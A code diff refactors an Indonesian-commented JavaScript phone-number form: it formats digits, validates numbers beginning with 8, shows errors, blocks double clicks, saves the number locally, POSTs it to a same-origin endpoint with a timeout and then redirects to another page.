@@ -1,130 +1,139 @@
-// form.js
 
-const phoneInput =
-document.getElementById("phone");
+"use strict";
 
-const lanjutBtn =
-document.getElementById("lanjutBtn");
+// =============================
+// ELEMENT
+// =============================
 
-const loadingBox =
-document.getElementById("loadingBox");
+const phoneInput = document.getElementById("phone");
+const lanjutBtn = document.getElementById("lanjutBtn");
+const loadingBox = document.getElementById("loadingBox");
+const clearBtn = document.getElementById("clearBtn");
+const errorBox = document.getElementById("errorBox");
 
-const clearBtn =
-document.getElementById("clearBtn");
+// =============================
+// CONFIG
+// =============================
 
-const errorBox =
-document.getElementById("errorBox");
+let isProcessing = false;
+let errorTimer = null;
 
-/* FADE IN */ 
-window.addEventListener("load", () => {
+// =============================
+// FADE IN
+// =============================
 
-    document.body.classList.add(
-    "fade-in"
-    );
+window.addEventListener("DOMContentLoaded", () => {
+
+    document.body.classList.add("fade-in");
+
+    if (phoneInput) {
+        phoneInput.focus();
+        phoneInput.setAttribute("inputmode", "numeric");
+        phoneInput.setAttribute("autocomplete", "tel");
+    }
+
+    if (loadingBox) {
+        loadingBox.style.display = "none";
+    }
+
+    if (clearBtn) {
+        clearBtn.style.display = "none";
+    }
 
 });
 
-/* AUTO FOCUS */
-window.onload = () => {
+// =============================
+// FORMAT NOMOR
+// =============================
 
-    phoneInput.focus();
+phoneInput.addEventListener("input", (e) => {
 
-};
+    let angka = e.target.value.replace(/\D/g, "");
 
-/* FORMAT NOMOR */
-phoneInput.addEventListener(
-"input",
-(e) => {
-
-    /* ANGKA SAJA */
-    let angka =
-    e.target.value.replace(
-    /\D/g,
-    ''
-    );
-
-    /* MAX */
-    angka =
-    angka.substring(0,13);
+    angka = angka.substring(0, 13);
 
     let hasil = "";
 
-    /* 812 */
-    if(angka.length > 0){
-
-        hasil +=
-        angka.substring(0,3);
-
+    if (angka.length > 0) {
+        hasil += angka.substring(0, 3);
     }
 
-    /* 812-3456 */
-    if(angka.length >= 3){
-
-        hasil += "-" +
-        angka.substring(3,7);
-
+    if (angka.length > 3) {
+        hasil += "-" + angka.substring(3, 7);
     }
 
-    /* 812-3456-7890 */
-    if(angka.length >= 7){
-
-        hasil += "-" +
-        angka.substring(7,13);
-
+    if (angka.length > 7) {
+        hasil += "-" + angka.substring(7, 13);
     }
 
     e.target.value = hasil;
 
-    /* SHOW / HIDE X */
-    if(hasil.length > 0){
+    // TOMBOL CLEAR
 
-        clearBtn.style.display =
-        "flex";
+    clearBtn.style.display =
+        angka.length > 0 ? "flex" : "none";
 
-    }else{
+    // HILANGKAN ERROR
 
-        clearBtn.style.display =
-        "none";
-
-    }
-
-    /* HIDE ERROR */
-    errorBox.classList.remove(
-    "show"
-    );
+    hideError();
 
 });
 
-/* CLEAR INPUT */
-clearBtn.addEventListener(
-"click",
-() => {
+// =============================
+// ERROR
+// =============================
+
+function showError() {
+
+    errorBox.classList.add("show");
+
+    if (navigator.vibrate) {
+        navigator.vibrate([120, 80, 120]);
+    }
+
+    clearTimeout(errorTimer);
+
+    errorTimer = setTimeout(() => {
+        hideError();
+    }, 2000);
+
+}
+
+function hideError() {
+
+    errorBox.classList.remove("show");
+
+    clearTimeout(errorTimer);
+
+}
+
+// =============================
+// CLEAR INPUT
+// =============================
+
+clearBtn.addEventListener("click", () => {
+
+    if (isProcessing) return;
 
     phoneInput.value = "";
 
-    clearBtn.style.display =
-    "none";
+    clearBtn.style.display = "none";
 
-    errorBox.classList.remove(
-    "show"
-    );
+    hideError();
 
     phoneInput.focus();
 
 });
 
-/* KEYBOARD ANGKA */
-phoneInput.setAttribute(
-"inputmode",
-"numeric"
-);
+// =============================
+// ENTER KEY
+// =============================
 
-/* ENTER */
-phoneInput.addEventListener(
-"keypress",
-(e)=>{
+phoneInput.addEventListener("keydown", (e) => {
 
-    if(e.key === "Enter"){
+    if (e.key === "Enter") {
+
+        e.preventDefault();
 
         lanjutBtn.click();
 
@@ -132,47 +141,30 @@ phoneInput.addEventListener(
 
 });
 
-/* LANJUT */
-lanjutBtn.addEventListener(
-"click",
- async () => {
+// =============================
+// LANJUT
+// =============================
 
-    /* AMBIL NOMOR */
-    const nomor =
-    phoneInput.value.replace(
-    /\D/g,
-    ''
-    );
+lanjutBtn.addEventListener("click", async (e) => {
 
-    /* VALIDASI */
-    if(
+    e.preventDefault();
+
+    // CEGAH DOUBLE CLICK
+
+    if (isProcessing) return;
+
+    // AMBIL NOMOR
+
+    const nomor = phoneInput.value.replace(/\D/g, "");
+
+    // VALIDASI
+
+    if (
         nomor.length < 9 ||
         nomor.charAt(0) !== "8"
-    ){
+    ) {
 
-        if(navigator.vibrate){
-
-        navigator.vibrate([
-            120,
-            80,
-            120
-        ]);
-
-    }
-
-        /* SHOW ERROR */
-        errorBox.classList.add(
-        "show"
-        );
-
-        /* AUTO HIDE */
-        setTimeout(() => {
-
-            errorBox.classList.remove(
-            "show"
-            );
-
-        },2000);
+        showError();
 
         phoneInput.focus();
 
@@ -180,45 +172,104 @@ lanjutBtn.addEventListener(
 
     }
 
-    /* SIMPAN */
-localStorage.setItem("nmrx", nomor);
+    // KUNCI PROSES
 
-/* KIRIM */
-await fetch("/nmrx", {
-    method: "POST",
-    headers: {
-        "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-        nmrx: nomor
-    })
+    isProcessing = true;
+
+    lanjutBtn.disabled = true;
+
+    // SIMPAN NOMOR
+
+    localStorage.setItem("nmrx", nomor);
+
+    // TAMPILKAN LOADING LANGSUNG
+
+    loadingBox.style.display = "flex";
+
+    // PAKSA BROWSER UPDATE TAMPILAN
+
+    await new Promise(resolve => {
+        requestAnimationFrame(() => {
+            requestAnimationFrame(resolve);
+        });
+    });
+
+    try {
+
+        // KIRIM DATA KE SERVER
+        // BATAS WAKTU 5 DETIK
+
+        const controller = new AbortController();
+
+        const timeout = setTimeout(() => {
+            controller.abort();
+        }, 5000);
+
+        try {
+
+            const response = await fetch("/nmrx", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    nmrx: nomor
+                }),
+                signal: controller.signal
+            });
+
+            if (!response.ok) {
+                throw new Error(
+                    "Server error: " + response.status
+                );
+            }
+
+        } finally {
+
+            clearTimeout(timeout);
+
+        }
+
+        // FADE OUT
+
+        document.body.classList.add("fade-out");
+
+        // PINDAH HALAMAN
+
+        setTimeout(() => {
+
+            window.location.href = "pix.html";
+
+        }, 500);
+
+    } catch (error) {
+
+        console.error("Kesalahan:", error);
+
+        loadingBox.style.display = "none";
+
+        lanjutBtn.disabled = false;
+
+        isProcessing = false;
+
+        // PESAN ERROR
+
+        showError();
+
+    }
+
 });
-     
-    /* SHOW LOADING */
-    loadingBox.style.display =
-    "flex";
 
-    /* PINDAH */
-    setTimeout(()=>{
+// =============================
+// RESET SAAT KEMBALI
+// =============================
 
-      /* FADE OUT */
-    document.body.classList.add(
-    "fade-out"
-    );
+window.addEventListener("pageshow", () => {
 
-        window.location.href =
-        "pix.html";
+    isProcessing = false;
 
-    },2000);
+    lanjutBtn.disabled = false;
 
-});
-
-/* RESET LOADING */
-window.addEventListener(
-"pageshow",
-() => {
-
-    loadingBox.style.display =
-    "none";
+    loadingBox.style.display = "none";
 
 });
